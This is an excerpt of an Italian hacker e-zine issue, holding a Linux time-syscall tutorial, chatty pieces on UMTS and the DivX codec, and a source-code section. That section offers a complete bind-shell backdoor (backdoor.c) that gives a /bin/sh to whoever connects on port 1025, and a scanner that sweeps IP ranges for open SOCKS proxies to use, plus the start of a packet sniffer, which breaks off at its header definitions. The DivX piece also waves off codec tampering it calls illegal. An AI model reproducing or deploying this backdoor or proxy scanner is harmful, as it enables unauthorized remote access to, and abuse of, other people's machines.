epoch time, questo termine indica che l'orologio di Linux inizia a mezzanotte del 1/1/1970
nel fuso orario di Greenwich.
Se andiamo a vedere nei sorgenti di qualche vecchio unix vediamo che la dqata è implementata
col tipo long, ma facendo 2 calcoli ci accorgiamo che questo il 19/02/2038 alle 03.14.07
traboccherebbe e creerebbe un panico maggiore di quello creato nel 2000. Pertanto gli
sviluppatori GNU hanno deciso di non usare il timo long ma il timo time_t che è cmq un long,
ma quando sarà necessario basterà cambiare la definizione di time_t e automaticamente
ricompilando i programmi funzionerà tutto.
Dopo questa precisazione iniziamo a vedere quanche sys_call. La prima è la time che ha questo
prototipo:

        #include <time.h>
	time_t time(time_t *t);

Questa funzione ha restituisce l'epoch time sia per riferimento sia con la restituzione del valore.

	time_t ora_corrente;
	ora_corrente = time(0);  //ora_corrente == epoch_time

oppure
	time_t  ora_corrente;
	time(&ora_corrente);    //ora_corrente == epoch_time

Anche se l'epoch time è utile a noi spesso ci serve la data in altri formati, ecco le
funzioni che ci tornano utili:

	char *ctime(const time_t *t);

Restituisce una stringa del formato Giorno Mese data ore:minuti:secondi anno .
Se vogliamo manipolare direttamente i singoli valori ci viene in aiuto la struttura tm
analizziamone i campi:

struct tm
{
  int tm_sec;			/* Secondi	[0-59]  */
  int tm_min;			/* Minuti	[0-59] */
  int tm_hour;			/* Ore	[0-23] */
  int tm_mday;			/* Giorno		[1-31] */
  int tm_mon;			/* Mese	[0-11] */
  int tm_year;			/* Anno	- 1900.  */
  int tm_wday;			/* Giorno della settimana	[0-6] */
  int tm_yday;			/* Giorno dell'anno.[0-365]	*/
  int tm_isdst;			/* ora legale		[-1/0/1]*/
};

Facciamo qualche precisazione:
-	nel campo tm_year il valore 100 indica l'anno 2000
-	nel campo tm_isdst il valore 1 indica che è in vigore l'ora 	legale, il
        valore 0 indica che non è iun vigore l'ora legale 	e il valore -1 indica che
        l'informazione non è disponibile

Bene, per sfruttare questa struttura utilizziamo la funzione:

	#include <time.h>
	struct tm dc *localtime(time_t *t);

La funzione prende come parametro un puntatore a un time_t e restituisce un puntatore ad
una struttura tm.

Bene guardiamo qualche altra funzione:

	#include <time.h>
	char *asctime(const struct tm *timeptr);

Questa funzione dato una struttura timeptr per riferimento ne restituisce una stringa.
La stringa restituita è dello stesso formato di ctime().

Un'altra funzione utile è la:

	time_t mktime(struct tm *time);

Questa funzione data una struttura tm restituisce la data nel formato epoch_time. I
campi tm_wday e tm_yday non devono per forza essere riempiti, vengono ricalcolati e in
output vengono sovrascritti.
Una cosa da tenere presente è nel campo tm_mon dove i mesi iniziano da zero e non da 1,
quindi dicembre sarà 11 e febbraio sarà 1.

Dopo questa carrellata di funzioni per la data e l'ora propongo un esempipo che comprende
un pò tutte le chiamate.

#include <stdio.h>
#include <time.h>

int main(){
	int anno, mese, giorno;
	struct tm perpertuo;
	time_t epoch_time;
	char n_day[10];

	printf("\nInserisci l'anno: ");
	scanf("%d",&anno);
	if (anno<1970){
		fprintf(stderr, "\nERRORE: anno non valido. Inserire un valore superiore a 1970\n");
		return -1;
	}

	printf("\nInerisci il mese: ");
	scanf("%d",&mese);
	if ((mese>12) || (mese<1)){
		fprintf(stderr, "\nERRORE: mese non valido. Inserire un valore tra 1 e 12\n");
		return -1;
	}

	printf("\nInserisci il giorno: ");
	scanf("%d",&giorno);
	if ((giorno<1)&&(giorno>31)){ 	//gestire tutti gli errori è fuorviente mper gli scopi dell'esempio, ma fondamentale per un esercizio vero
		fprintf(stderr, "\nERRORE: giorno non valido. Inserire un valore tra 1 e 31\n");
		return -1;
	}

	//impostiamo i campi della struttura tm
	//non è necessario riempire tutti i campi
	perpertuo.tm_sec=0;		//noi dobbiamo calcolare solo la data, quindi i secondi, i minuti e i secxondio sono ininfluenti
	perpertuo.tm_min=0;
	perpertuo.tm_hour=0;
	perpertuo.tm_mday=giorno;
	perpertuo.tm_mon=mese-1;		//i mesi vanno da 0 a 11
	perpertuo.tm_year=anno-1900;
	perpertuo.tm_isdst=0;

		//gli facciamo creare il file nel formato epoch_time
	//vengono riempiti anche i campi wday, yday
	epoch_time = mktime(&perpertuo);

	switch(perpertuo.tm_wday){
		case 0:
			strcpy(&n_day,"Domenica");
			break;
		case 1:
			strcpy(&n_day,"Lunedì");
			break;
		case 2:
			strcpy(&n_day,"Martedì");
			break;
		case 3:
			strcpy(&n_day,"Mercoledì");
			break;
		case 4:
			strcpy(&n_day,"Giovedì");
			break;
		case 5:
			strcpy(&n_day,"Venerdì");
			break;
		case 6:
			strcpy(&n_day, "Sabato");
			break;
	}

	printf("\n%d/%d/%d era un %s\n",giorno, mese, anno, n_day);

	return 0;
}

Conclusione
Questa è solo la punta dell'iceberg di tutto l'universo delle syscall di Linux, in un
prossimo articolo continueremo il viaggio nelle syscall affrontando la gestione de file system
Ringrazio noflyzone per avermi permesso di inserire quello piccolo articolo per la e-zine numero 4,
									Kernel2418

------------------------------------<END>--------------------------------------

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-------------------------------------------------------------------------------
-----------------------------------[NEWS]--------------------------------------
-------------------------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

-------------------------------------<24>--------------------------------------
---------------------------------<cyberdude>-----------------------------------
------------------------------------<UMTS>-------------------------------------


.:: U M T S ::.
TuToRiAl bY cyBErDuDe
_____________________

Wow... ragazzi quasi non ci credo, siamo alla terza uscita della nostra mitica
E-zine! Voi siete ancora qui... io sono ancora qui! di cosa parleremo in questo
numero? Ma è semplice di UMTS ...cosa significa UMTS? Umts sta per Universal
Mobile Telecommunications System.L'Umts giocherà un ruolo chiave nel creare il
futuro mercato globale per l'alta qualità delle comunicazioni multimediali tanto
che ci saranno 2 miliardi di utilizzatori entro l'anno 2010. Per cui, la migliore
cosa che possiamo fare, è parlarne insieme per capire cosa sia veramente!!
Iniziamo subito senza perdere altro tempo :)

Vi chiedete perché UMTS? vi rispondo io... L'Umts permetterà alle Information
Society di distribuire informazioni, offrire e-commerce e giochi alla telefonia
mobile in piena libertà di movimento attraverso una rete wireless e satellitare.
L'Umts aumenterà la velocità di aggregazione delle telecomunicazioni,
dell'Information tecnology, dei media e dei fornitori di contenuti nel consegnare
nuovi servizi. L'Umts consegnerà a basso costo comunicazioni ad alta velocità
(2Mbit/sec) su tutto il pianeta. Capito perché UMTS?

Adesso che avete capito il perché, penso vi starete chiedendo, quando potremo
usarlo... sarà lanciato commercialmente dal 2002, per quanto riguarda le licenze,
gia assegnate!!! In Italia a Toriano Ericsson e Tim stanno sperimentando il nuovo
servizio!

Sapete che serviranno più di 6 miliardi di euro per rendere operative le reti
Umts entro la fine del 2001? Penso voi sappiate cosa sia una SIM (Subscriber
Identity Module) o se le chiamate Smart Card, queste, gia ora molto sicure e
ad un certo grado di personalizzazione dell'utente, continueranno la loro
evoluzione anche con L'UMTS. Nasceranno dunque la USIM che saranno più rapide
e offriranno maggiore memoria!! meglio vero?

Adesso, chiaramente vi starete chiedendo se sto capolavoro di UMTS sia compatibile
con il protocollo internet ( IP ) vi basti pensare che Il numero di reti ed
applicazioni IP sta crescendo rapidamente.L'UMTS diverrà la più flessibile
tecnologia di accesso a banda larga in quanto consente l'uso residenziale, da
ufficio a mobile, in una vasta gamma di reti pubbliche e non pubbliche. Wow ragazzi
se mi metto a leggere tutte queste cose che sto dicendo, mi sembra quasi di essere
l'omino della pubblicità che espone il suo prodotto hihihihihiih :)
L'UMTS può supportare sia il traffico IP, sia non IP, in una varietà di modalità
che includono quella a pacchetti, quella a commutazione ed il circuito virtuale.
Come ho gia detto il numero di reti ed applicazioni IP sta crescendo rapidamente;
quella più conosciuta è Internet, ma le reti private IP (intranet) mostrano ritmi
di crescita e di utilizzo simili se non addirittura maggiori.

Inoltre Oltre alla capacità di adattarsi ai diversi standard, i terminali saranno
capaci di effettuare il download da rete per permettere agli operatori di rete di
distribuire via radio nuovo software!!! Vi piace vero? hihihihihi :) Ma comunque
questo aspetto del downloading di software generalmente sarà invisibile all'utente
e in pratica fattibile soltanto dagli operatori di rete :(
In poche parole, mentre nei nostri cari PC per aggiornarli dobbiamo scaricare del
nuovo software ( ad esempio per ascoltare MP3 ecc.) negli UMTS i nuovi plug-in
saranno installati nel terminale direttamente dall'operatore o dal provider,
naturalmente verranno scaricati via radio (2 MB/s) hhihiihhi bello vero?
L&#8217;UMTS utilizza un tipo di trasmissione basata sulla trasmissione di pacchetti
con benefici come: connessione virtuale alla rete 24 ore su 24, modalità alternative
di pagamento (pay-per-bit, per sessione ecc.) oserei dire ancora meglio hihihihi :)

L&#8217;UMTS è concepito come un sistema globale, comprendente componenti terrestri e
satellitari. Terminali operanti secondo modalità multiple (anche tramite sistemi
2G, cioè GSM 900 e 1800) estenderanno ulteriormente la portata dei servizi UMTS.

Ma come ogni cosa, c'è sempre il così detto "pacco" infatti anche UMTS ha qualche
suo "difettuccio" se così lo vogliamo chiamare :
Infatti nelle applicazioni pratiche, i terminali UMTS potrebbero essere anzi saranno
incapaci di operare costantemente alle velocità più alte, infatti allo scopo
di impedire che gli utenti utilizzino in continuo i loro terminali, i servizi
saranno adattati alla velocità di trasmissione disponibile e ad altri parametri
QoS (Quality of Service).
Per concludere, vorrei aggiungere la parte più brutta di tutto il tutorial...
hihihiih il PREZZO!!! purtroppo si dice che i prezzi non ancora stabiliti
saranno poco accessibili :((((((((((((((((((((((((((((((((((((((((((((((((
Ma allora perchè tanta pubblicità ?!?
Vabbè ragazzi io ho concluso, spero questo tutorial sia stato d'aiuto a tutti coloro
che volevano saperne un pò di più sull'UMTS!!!
Ciao, alla prossima ... Cyberdude :)

T H E   E N D

------------------------------------<END>--------------------------------------

-------------------------------------<25>--------------------------------------
---------------------------------<cyberdude>-----------------------------------
------------------------------------<DIVX>-------------------------------------


-----=[ INTRO ]=-----

Caspita ragazzi... che strano inizio che ha avuto sto tutorial!! diciamo semplicemente
che è un caso che io abbia scritto proprio questo! Ma vi spiego meglio la storia!! Ero
in chat a parlare con Biga delle solite stronzate (programmazione, protocolli, bug ecc.)
insomma una normale serata quando parlando dei vecchi tutorial Biga mi dice di essersi
offeso che nonostante siamo così amici, non ha visto una dedica per lui su un tutorial!
Io preso dal senso di colpa, gli ho chiesto di scegliere un argomento e io ne avrei
scritto un tutorial sopra e poi naturalmente l'avrei dedicato a lui!! Indovinate lui
cosa mi ha chiesto di scrivere ? >>> un tutorial su ASF (che cazzo sarà? vi chiederete
voi... beh lo vedremo più in là) Comunque il caso ha voluto che io leggendo sui giornali
alla ricerca di un punto di partenza per questo studio così strano, abbia trovato sul un
giornale che non sto a citare per non fare pubblicità qualcosa inerente a sto ASF...
leggendo oltre mi sono accorto che andavo completamente fuori traccia ma comunque mi è
piaciuto e ho continuato a leggere... poi ho buttato su questo text quello che ne avevo
capito ed ecco il tutorial che state leggendo!! Bella storia vero? Giuro che è tutta
realtà

-----=[ DEDICHE ]=-----

Mi sembra scontato che la dedica di questo tutorial va a una persona in particolare ...
BIGALEX ... (Biga se non ti leggi tutto il tutorial mi prendo collera hhihihihihi )
Comunque la dedica è anche per tutti voi!! Buona lettura a tutti ...e direi di iniziare

-----=[ START TUTORIAL ]=-----

Formato DivX, tra mito e realtà
(che titolo ... ammetto di averlo copiato dall'articolo del giornale ma che ci volete
 fare mi piaceva troppo hihihihihi)
Dai non perdiamo tempo... iniziamo :)
Dunque come promesso a Biga, inizieremo parlando di ASF... ok? Nonostante l&#8217;Advanced
Streaming Format (ASF) sia il cuore della tecnologia Windows Media, stenta ad imporsi
per la presenza di numerose valide alternative. Il vero problema del formato ASF è
rappresentato dalla scarsa compatibilità con i sistemi operativi diversi da Windows, e
dall&#8217;essere soggetto a licenze piuttosto restrittive... chiaro il pensiero? Nello
scenario attuale, in cui Microsoft, Apple e Realnetworks investono ingenti somme in
marketing e ricerca con l&#8217;obiettivo di far prevalere le proprie tecnologie, si inserisce
un elemento perturbatore: il DivX :-). Grazie a DivX :-) non è difficile convertire file
AVI o QuickTime in filmati compatibili con i sistemi operativi più diffusi e
riproducibili mediante programmi specifici... quindi a questo punto il caro e ben amato
file ASF che tanto piace a Biga se ne va a farsi fottere per lasciare spazio a migliori
formati come il DivX !! mi spiace Biga non ci pensare e leggiti sto tutorial che è molto
meglio del ASF :) hihihihi Dopo la comparsa delle prime versioni del codec Divx sono
stati in molti ad intuire le potenzialità di un mercato cinematografico on-line, diversi
gruppi di programmatori hanno avviato dei progetti per creare la piattaforma di
distribuzione del futuro. La maggior parte dei progetti ha vocazioni open-source, sarà
interessante verificare se gli interessi commerciali soffocheranno i buoni propositi
originali!! Detto questo possiamo fare altre costatazioni... diamo come titolo del nostro
secondo paragrafetto >>> PASSATO, PRESENTE, FUTURO <<< a cosa vi fa pensare? beh scoprite
subito subito di cosa voglio parlarvi leggendo quanto segue hihihih... sembro proprio un
giornalista :) DivX  non è altro che una versione modificata dei codec MPEG-4 distribuiti
con Windows Media Player. In particolare le versioni &#8220;ritoccate&#8221; sono le seguenti:
4.1.00.3920 per il codec Low-Motion e 4.1.00.3917 per quello Fast-Motion. I cambiamenti
si riducono alla rimozione di alcune limitazioni come l&#8217;impossibilità di convertire file
ASF in altri formati e di utilizzare il codificatore MP3. Si tratta ovviamente di
un&#8217;operazione illecita, ma sinceramente che ce ne frega? noi siamo qui per leggere giusto?
quindi è bene che io ve lo dica ma che questo non sia un ostacolo per la lettura del mio
tutorial ok? ihihihihi :) In effetti,ragazzi, in un futuro non troppo lontano, il DivX
o una sua evoluzione, potrebbe rappresentare per il video ciò che il formato MP3 è oggi
per l&#8217;audio: lo standard de facto. Gli autori, se così si possono chiamare, del formato
in analisi sono due hacker europei noti con gli pseudonimi Gej e Max Morice. Il nome
scelto per il codec ricorda molto quello di una tecnologia di videonoleggio imperniata
sui DVD, chiamata DIVX, relativamente diffusa negli Stati Uniti ed in Canada ormai in
fase di abbandono. Al fine di distinguere le due cose gli autori hanno optato, forse con
un pizzico di ironia, per rendere la faccina :-) parte integrante del nome... un pò
cretini a questo punto hiihihih (quindi ricordate si chiama DivX :-) ma io eviterò di
metterci la faccina... ok? ) Allora, continuiamo il discorso , abbiamo detto che DivX
nasce come una versione &#8220;contraffatta&#8221; dell&#8217;implementazione Microsoft dello standard
MPEG4. Il termine MPEG4 definisce uno standard sviluppato dal comitato MPEG (Moving
Picture Experts Group), un gruppo costituito da centinaia di ingegneri e ricercatori.
L&#8217;obiettivo principale del formato MPEG4 è integrare la produzione, la distribuzione e
la fruizione di contenuti multimediali in tre campi:

&#8226; World Wide Web
&#8226; Televisione digitale
&#8226; Applicazioni grafiche interattive

Ma diciamo che MPEG lavora in maniera differente rispetto agli altri metodi di
compressione video, invece di comprimere i singoli fotogrammi cerca di ridurre lo spazio
occupato da intere sequenze di immagini.Lo standard MPEG opera in modo analogo all&#8217;MP3,
ovvero cerca di sintetizzare il sistema percettivo umano in algoritmi definiti
psicovisuali e psicoacustici. Per esempio i codec MPEG utilizzano la regola empirica
del &#8220;5 percento&#8221;, una regola secondo la quale l&#8217;orecchio e l&#8217;occhio umano non apprezzano
cambiamenti inferiori al cinque percento.Non è un caso che il frame-rate di un apparecchio
televisivo sia di 30 fotogrammi al secondo, il cambiamento è quindi del 3%. Diminuire il
frame-rate, ossia il numero di fotogrammi al secondo, significa aumentare la percentuale
di cambiamenti e da un punto di vista pratico anche la sensazione di disagio di chi è
davanti al video. Le implementazioni ufficiali dello standard MPEG sono due: una in
linguaggio C fornita dal progetto ACTS-MOMUSYS ed una in C++ offerta da Microsoft...
adesso voi direte ma questo dove vuole arrivare, seguitemi altri 2 minutini e vi prometto
che vi si chiariranno le idee ihhiihih ;) DivX :-) è un ottimo strumento per produrre
filmati di qualità e contenere le dimensione dei file, dimenticatevi però lo streaming
dei dati. Su Internet potete imbattervi in un coacervo di programmi basati su DivX :-)
che consentono di comprimere 9 gigabyte di video DVD in un singolo cd-rom da 650 megabyte.
Trattandosi di una pratica illegale non posso fornirvi ulteriori informazioni... anche se
so che vi interesserebbe molto ma purtroppo così mi metto nei guai e non posso rischiare
ok? Esistono anche altri codec, quasi tutti meno efficienti del DivX :-) ma utilizzabili
lecitamente, in grado di generare file nel comune formato AVI. Ogni codec in ambiente
Windows è identificato univocamente da un codice di quattro cifre noto come Four
Character Code ... Adesso vi elenco i codici relativi ad alcuni tra i codec Video più
comuni:

Four Character Code	                          Nome del codec

DIB (oppure RGB, RAW)	                        File AVI non compresso
MRLE	                                      Microsoft Run-Length Code
MSVC (oppure CRAM)	                         Microsoft Video
IV31 / IV32	                                Intel Indeo 3.1/3.2
CVID	                                              Cinepak
VDOM	                                          VDOWave o VDOLive
VIVO	                                        Netshow &#8211; Vivo H.263
MPG4	                                                 MPG-4
DIV3 o DIV4	                                        DivX :-)

Se volete conoscere quali codec audio/video sono installati sul vostro computer dovete
utilizzare il pannello di controllo oppure scrivere un programmino che legga dal registro
di sistema il contenuto delle chiavi:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\drivers.desc
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Drivers32

Quanto detto vale per i sistemi operativi Windows NT/2000, se usate altre versioni dovete
controllare la voce [drivers] del file system.ini
Beh a leggere tutto questo certamente (come ho fatto io) vi sarete innamorati del DivX
ma come ogni cosa bella c'è sempre 1 lato negativo... vediamo l'altra faccia della medaglia
Gli strumenti di sviluppo sono divisi in sei categorie:

&#8226; Windows Media Player &#8211; Pagine Web, applicazioni e documenti basati su COM possono
                         sfruttare le funzioni di riproduzione dell&#8217;ActiveX Windows Media
                         Player. La versione 7 è utilizzabile con i linguaggi di
                         scripting VBScript e JScript, la release precedente supporta
                         l&#8217;interfaccia IDispatch ed è stata inclusa per motivi di
                         compatibilità.

&#8226; Windows Media Services &#8211; Gestione di servizi di streaming unicast e multicast. Con
                           unicasting streaming si intende l&#8217;invio di dati stream ad ogni
                           client che ne faccia richiesta. Il multicasting invece è
                           paragonabile al servizio offerto da una stazione radio, il
                           segnale è inviato sulla rete da un fornitore di contenuti e
                           più client possono captarlo e riprodurlo nello stesso momento.

&#8226; Windows Media Format &#8211; Supporto per la lettura, la scrittura e l&#8217;elaborazione di file
                         multimediali ottimizzati per lo streaming. Utile anche per
                         scaricare i dati multimediali su dispositivi portatili.

&#8226; Windows Media Rights Manager &#8211; Creazione e gestione di informazioni sui diritti
                                 d&#8217;autore per file Windows Media.

&#8226; Windows Media Encoder &#8211; Interfacce COM per la configurazione ed il controllo della
                          codifica di dati in formato Windows Media. Il Media Encoder
                          SDK consente di convertire audio e video in file Windows Media.
                          E&#8217; superfluo sottolineare che i file .AVI creati con DivX :-)
                          non rientrano nella definizione Windows Media&#8230;

&#8226; Windows Media Metafiles &#8211; Produzione di playlist con la possibilità di includere
                            messaggi pubblicitari. I Windows Media metafile sono file di
                            testo in linguaggio XML che corredano gli stream multimediali

Beh tutto qui!! spero che questo tutorial vi sia piaciuto e che non mi sputiate in faccia
perché magari vi aspettavate qualche consiglio illecito che non posso darvi per motivi
ovvi...l'unico consiglio che ci tengo a darvi è studiate, approfonditelo con le vostre
forze e chi sa, forse un giorno riuscirete ad inventare voi qualcosa del genere...
Io ho finito qui, saluto tutti in particolare Biga che è stata la mia rampa di lancio per
iniziare a scrivere sto tutorial!! Tnk amico... ciao a tutti :) Alla prossima

Cyberdude


------------------------------------<END>--------------------------------------


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-------------------------------------------------------------------------------
----------------------------------[SOURCE]-------------------------------------
-------------------------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

------------------------------------<26---------------------------------------
----------------------------------<[V]lad>-------------------------------------
--------------------------------<Sockfind.c>-----------------------------------

/*
       Produced by.... [V]lad[D]racul .....

In esclusiva per NFZine #4 un utile sock finder!!!!!
Così potete cercare i socket da utilizzare nel mio tutorial su
dante socksify!!!! Non sono ancora capace di utilizzare quelle
che chiamo "parallel socket"... quindi lo scanner nn è un mostro
di velocità... però nn è neanche malvagio!! Non abusate troppo dei
sock eh??
 */
#include	<sys/types.h>
#include	<sys/socket.h>
#include	<netinet/in.h>
#include	<arpa/inet.h>
#include	<errno.h>
#include	<fcntl.h>
#include	<netdb.h>
#include	<signal.h>
#include	<string.h>
#include	<unistd.h>

int fd; //il file decriptor

void connect_read_timeout() { //funzioncina per il timeout
	close(fd);
}

int main(int argc, char *argv[])
{
  int sock_ok;
  unsigned long int start, end, count; // normalissime variabili e struttura per gestire i socket
  struct sockaddr_in mysock;

  if(argc != 3){ // Se utilizzate male il prog. stampo l'usage
    printf("usage: %s start-ip end-ip\n", argv[0]);
    return 0;
  }

  start = inet_addr(argv[1]); // prendo l'ip di inizio
  end = inet_addr(argv[2]);// e quello di fine

  for(count = ntohl(start); count <= ntohl(end); count++) { //iniziamo il ciclo che incrementa sempre l'ip finchè
                                                           // nn è uguale all'ip finale
    if((count & 0xff) == 0)count++; // se trovo uno 0 nell'ip incremento
    if((count & 0xff) == 255)count++;//stesso discorso se trovo un 255

    mysock.sin_family = AF_INET; //famiglia
    mysock.sin_port = htons(1080);//porta di defoult per i sock
    mysock.sin_addr.s_addr = htonl(count);//indirizzo
    memset(&(mysock.sin_zero), '\0', 8);//metto a 0 il resto della struct
    fd=socket(AF_INET, SOCK_STREAM, 0);//apro il socket

    signal(SIGALRM, connect_read_timeout);//sposto l'esecuzione sotto timer
    alarm(1);//setto il timer a 1 sec
    if((sock_ok = connect(fd, (struct sockaddr *)&mysock, sizeof(struct sockaddr))) == 0){
      puts("sock found at: ");//controllo se ho trovato un sock e stampo l'ip
      puts(inet_ntoa(mysock.sin_addr));
    }
    alarm(0);//chiudo il timer
  }
  close(fd);
  return 0;
}
/*
  Se vi state chiedendo perché ho utilizzato un timer la risposta è:
  "perché la funzione connect() ha un timeout lunghissimo!!!" Infatti se
  nn trova un ip esistente tenta di riconnettersi per circa 60 sec... i questo modo
  invece se nn si connette entro 1 sec faccio morire il socket chiudendolo e passo
  al prossimo
 */

------------------------------------<END>--------------------------------------

------------------------------------<27>---------------------------------------
----------------------------------<[V]lad>-------------------------------------
--------------------------------<backdoor.c>-----------------------------------

/*
                In esclusiva per NFZ #4 [V]lad[D]racul presenta....

  Piccola back-door che apre una shell sulla  porta 1025. Se volete aprire una porta compresa fra 0-1024 
  dovete essere root(nn lo sapevate?!??!?! :-P). Ho messo i commenti per i NewBies dei socket

  Ovviamente si kiude dopo il primo utilizzo.

  Produced by [V]lad[D]racul member of NoFlyZone-Crew: irc.azzurra.net #NoFlyZone
*/



#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 1025 //Porta che la backdoor apre
#define MAX_CNT 1 //Accetta al massimo 1 connessione
#define MAX_DATA 256 //potete inviare al massimo 256 bytes

int main(int argc, char *argv[])
{
  int fd, client_fd; //files descriptor
  int sin_size, msg_bytes; // variabili dove metterò le grandezze del buffer
  char *buffer, msg[MAX_DATA]; //stringhe
  struct sockaddr_in my_addr; // definizione struct del server
  struct sockaddr_in their_addr; // definizione struct del client

  if(!(fd = socket(AF_INET, SOCK_STREAM, 0))) { //apro il socket
    printf("unable to initializate socket\n");
  }

  my_addr.sin_family = AF_INET; // definisco la famiglia
  my_addr.sin_port = htons(PORT); // definisco la porta
  my_addr.sin_addr.s_addr = INADDR_ANY; //definisco come IP del server l'IP locale
  memset(&(my_addr.sin_zero), '\0', 8); // setto a 0 tutto il resto della struct
   
  if((bind(fd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr))) == -1) { //apro la backdoor sulla porta
    printf("unable to initializate bind\n");
    return -1;
  }

  if(listen(fd, MAX_CNT) == -1) { //Mi metto in ascolto e accetto solo MAX_CNT connessioni
    printf("unable to initializate listen\n");
    return -1;
  }

  sin_size = sizeof(struct sockaddr_in);// sin_size assume la grandezza della struct

  if((client_fd = accept(fd, (struct sockaddr *)&their_addr, &sin_size)) == -1) { //accetto la connessione 
    printf("unable to initializate accept");
    return -1;
  }

  buffer = "Salve supremo padrone... aspettavo giusto lei.\n\nposso dirle che è un genio??\n\n\nMi permetta di regalarle una shell... come umile dono che rispecchi in scala la sua infinita genialità.";
  send(client_fd, buffer, strlen(buffer), 0);// sendo la stringa
  msg_bytes = recv(client_fd, msg, MAX_DATA-1, 0);//ricevo una stringa(nella prossima versione chiederò una passwd)

  msg[msg_bytes] = '\0'; // metto il carattere "fine stringa" alla stringa per evitare casini fastidiosi

  send(client_fd, msg, strlen(msg), 0);//mando una risposta(questo l'ho inserito per farvi vedere come si fa... potete anche toglierlo)

  
  dup2(client_fd, 0);// duplico il socket
  dup2(client_fd, 1);//lo riduplico
  dup2(client_fd, 2);//lo ririduplico (questa procedura serve per redirigere la prossima istruzione compresa di I/O al socket)
  system("/bin/sh -i");//apro la shell

  close(fd);//chiudo il socket
  close(client_fd);//chiudo il socket
    return 0;
}

//Niente applausi prego

------------------------------------End----------------------------------------

------------------------------------<28>---------------------------------------
--------------------------------<CityHunter>-----------------------------------
--------------------------------<sniffcap.c>-----------------------------------

Beh,a dire il vero volevo farci un tutorial sopra, ma Valk mi ha preceduto:(
Allego qui solo il sorgente, con l'art di Valk e il mio dovreste capire tutto.
Byezzz


#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>

# include <sys/types.h>

typedef	u_int32_t tcp_seq;
/*
 * TCP header.
 * Per RFC 793, September, 1981.
 */
struct TCPhdr
  {
    u_short th_sport;		/* source port */
    u_short th_dport;		/* destination port */
    tcp_seq th_seq;		/* sequence number */
    tcp_seq th_ack;		/* acknowledgement number */
#  if __BYTE_ORDER == __LITTLE_ENDIAN
    u_int8_t th_x2:4;		/* (unused) */
    u_int8_t th_off:4;		/* data offset */
#  endif
#  if __BYTE_ORDER == __BIG_ENDIAN
    u_int8_t th_off:4;		/* data offset */
    u_int8_t th_x2:4;		/* (unused) */
#  endif
    u_int8_t th_flags;
#  define TH_FIN	0x01
#  define TH_SYN	0x02
#  define TH_RST	0x04
#  define TH_PUSH	0x08
#  define TH_ACK	0x10
#  define TH_URG	0x20
    u_int16_t th_win;		/* window */
    u_int16_t th_sum;		/* checksum */
    u_int16_t th_urp;		/* urgent pointer */
};

struct my_ip {
	u_int8_t	ip_vhl;		/* header length, version */
#define IP_V(ip)	(((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)	((ip)->ip_vhl & 0x0f)
	u_int8_t	ip_tos;		/* type of service */
	u_int16_t	ip_len;		/* total length */
	u_int16_t	ip_id;		/* identification */
	u_int16_t	ip_off;		/* fragment offset field */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
	u_int8_t	ip_ttl;		/* time to live */
	u_int8_t	ip_p;		/* protocol */
	u_int16_t	ip_sum;		/* checksum */
	struct	in_addr ip_src;
	struct  in_addr ip_dst;	/* source and dest address */
};


#include <sys/cdefs.h>
#include <sys/types.h>


struct UDPhdr {
         u_int16_t uh_sport;           /* source port */
         u_int16_t uh_dport;           /* destination port */
         u_int16_t uh_ulen;            /* udp length */
         u_int16_t uh_sum;             /* udp checksum */
};

struct ICMPhdr
{
  u_int8_t type;		/* message type */
  u_int8_t code;		/* type sub-code */
  u_int16_t checksum;
  union
  {
    struct
    {
      u_int16_t	id;
      u_int16_t	sequence;
    } echo;			/* echo datagram */
    u_int32_t	gateway;	/* gateway address */
    struct
    {
      u_int16_t	__unused;
      u_int16_t	mtu;
    } frag;			/* path mtu discovery */
  } un;
};

#define ICMP_ECHOREPLY		0	/* Echo Reply			*/
#define ICMP_DEST_UNREACH	3	/* Destination Unreachable	*/
#define ICMP_SOURCE_QUENCH	4	/* Source Quench		*/
#define ICMP_REDIRECT		5	/* Redirect (change route)	*/
#define ICMP_ECHO		8	/* Echo Request			*/
#define ICMP_TIME_EXCEEDED	11	/* Time Exceeded		*/
#define ICMP_PARAMETERPROB	12	/* Parameter Problem		*/
#define ICMP_TIMESTAMP		13	/* Timestamp Request		*/
#define ICMP_TIMESTAMPREPLY	14	/* Timestamp Reply		*/
#define ICMP_INFO_REQUEST	15	/* Information Request		*/
#define ICMP_INFO_REPLY		16	/* Information Reply		*/
#define ICMP_ADDRESS		17	/* Address Mask Request		*/
#define ICMP_ADDRESSREPLY	18	/* Address Mask Reply		*/
#define NR_ICMP_TYPES		18


/* Codes for UNREACH. */
#define ICMP_NET_UNREACH	0	/* Network Unreachable		*/
#define ICMP_HOST_UNREACH	1	/* Host Unreachable		*/
#define ICMP_PROT_UNREACH	2	/* Protocol Unreachable		*/
#define ICMP_PORT_UNREACH	3	/* Port Unreachable		*/
#define ICMP_FRAG_NEEDED	4	/* Fragmentation Needed/DF set	*/
#define ICMP_SR_FAILED		5	/* Source Route failed		*/
#define ICMP_NET_UNKNOWN	6
#define ICMP_HOST_UNKNOWN	7
#define ICMP_HOST_ISOLATED	8
#define ICMP_NET_ANO		9
#define ICMP_HOST_ANO		10
#define ICMP_NET_UNR_TOS	11
#define ICMP_HOST_UNR_TOS	12
#define ICMP_PKT_FILTERED	13	/* Packet filtered */
